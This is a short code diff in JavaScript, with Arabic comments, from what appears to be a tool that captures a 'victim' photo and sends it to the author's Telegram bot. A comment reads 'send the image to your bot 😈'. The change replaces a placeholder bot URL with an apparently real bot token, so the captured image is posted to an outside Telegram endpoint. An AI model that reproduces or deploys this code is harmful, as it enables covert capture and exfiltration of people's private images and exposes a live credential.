@@ -14,7 +14,7 @@
                 formData.append('image', blob, 'victim_photo.jpg');
                 
                 // إرسال الصورة إلى البوت الخاص بك 😈
-                await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto', {
+                await fetch('https://api.telegram.org/8217644880:AAFZV9m-_825tr6NMiao1Dcf1phmA8NBxiM/sendPhoto', {
                     method: 'POST',
                     body: formData
                 });
